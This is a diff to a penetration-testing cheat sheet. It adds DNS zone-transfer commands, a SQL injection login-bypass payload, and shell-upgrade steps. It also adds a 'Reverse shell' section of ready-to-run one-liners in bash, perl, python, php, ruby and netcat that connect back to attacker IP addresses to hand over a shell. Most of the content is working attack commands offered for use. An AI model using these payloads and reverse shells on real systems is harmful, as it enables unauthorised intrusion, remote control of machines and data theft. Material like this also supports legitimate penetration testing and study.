@@ -86,7 +86,9 @@ Contents
                   https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
             53 -DNS
                nslookup - server <ip>
+               nslookup <ip>
                DNS zone transfer -TCP
+                   dig axfr @ip_address dns_name
                   
                
                
@@ -269,6 +271,7 @@ Contents
          https://www.tarlogic.com/en/blog/red-team-tales-0x01/
          https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
             ' or '1'='1
+            ' or 1=1-- -
          http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
          https://www.doyler.net/security-not-included/oracle-command-execution-sys-shell
          https://portswigger.net/web-security/sql-injection/union-attacks
@@ -508,12 +511,14 @@ Contents
                               python -c 'import pty; pty.spawn("/bin/bash")' 
                               Ctrl-Z 
                         #In Kali 
+                              echo $TERM
+                              echo $SHELL
                               stty raw -echo 
                               fg 
                         #In reverse shell 
                               reset 
                               export SHELL=bash 
-                              export TERM=xterm-256color 
+                              export TERM=screen-256color 
                               stty rows <num> columns <cols>  
         
    4.2 Windows           
@@ -813,6 +818,17 @@ PHP Reverse Shells
 
     Windows PHP Reverse Shell — https://github.com/Dhayalanb/windows-php-reverse-shell
     PenTestMonkey Unix PHP Reverse Shell — http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+    
+
+Reverse shell
+   bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+   perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+   php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+   ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+   nc -e /bin/sh 10.0.0.1 1234
+   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 1234 >/tmp/f
+   
 
 Terminal Related
 
